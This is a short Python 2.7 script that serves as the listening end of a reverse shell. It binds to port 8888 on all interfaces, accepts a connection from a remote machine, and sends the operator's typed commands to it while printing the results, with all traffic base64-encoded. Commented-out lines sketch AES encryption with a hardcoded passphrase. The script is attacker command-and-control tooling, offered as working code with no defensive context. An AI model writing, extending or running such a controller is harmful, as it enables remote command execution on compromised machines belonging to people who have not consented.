#!/usr/bin/env python2.7

from __future__ import print_function
import socket
import base64
from time import sleep

#PADDING = '{'

#passphrase = b"QWERTY1234567890"

#global cipher
#cipher = AES.new(passphrase, AES.MODE_ECB)

#pad = lambda s: s + (16 - len(s) % 16) * PADDING

#encrypt = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
#decrypt = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)

def createSocket():
	global ip
	ip = '0.0.0.0'
	global port
	port = 8888
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((ip,port))
	s.listen(5)
	print ("Listening on port {}".format(port))
	acceptConn(s)

def acceptConn(s):
	conn, addr = s.accept()
	print ("Connection received from {} on port {}".format(addr[0], int(addr[1])))
	sendCommand(conn)

def sendCommand(conn):
	#global cipher
	while True:
		data = conn.recv(2048)
		data = base64.b64decode(data)
		print(data, end='')
		cmd = raw_input()
		if cmd == 'exit':
			cmd = base64.b64encode(cmd)
			conn.send(cmd)
			sleep(1)
			conn.close()
			exit()
		if len(cmd) > 0:
			cmd = base64.b64encode(cmd) 
			conn.send(cmd) 
		if len(cmd) == 0:
			cmd = "null"
			cmd = base64.b64encode(cmd)
			conn.send(cmd)

createSocket()
